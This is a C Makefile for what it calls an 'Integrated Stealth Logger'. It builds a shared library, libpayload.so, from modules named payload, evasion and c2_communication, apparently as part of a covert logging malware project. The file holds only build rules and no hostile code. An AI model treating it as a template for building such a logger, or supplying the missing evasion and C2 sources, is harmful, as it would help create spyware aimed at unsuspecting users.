# Integrated Stealth Logger Makefile
CC = gcc
CFLAGS = -Wall -Wextra -O2 -fPIC -std=c99
LDFLAGS = -shared -lpthread

# Targets
all: libpayload.so main

libpayload.so: payload.o evasion.o c2_communication_fixed.o
	$(CC) $(LDFLAGS) -o $@ $^

main: main.o
	$(CC) $(CFLAGS) -o $@ $^

# Object files
payload.o: payload.c payload.h payload_config.h
	$(CC) $(CFLAGS) -c -o $@ $<

evasion.o: evasion.c evasion.h config.h
	$(CC) $(CFLAGS) -c -o $@ $<

c2_communication_fixed.o: c2_communication_fixed.c c2_communication_fixed.h config.h
	$(CC) $(CFLAGS) -c -o $@ $<

main.o: main.c payload.h evasion.h c2_communication_fixed.h
	$(CC) $(CFLAGS) -c -o $@ $<

# Clean
clean:
	rm -f *.o libpayload.so main

.PHONY: all clean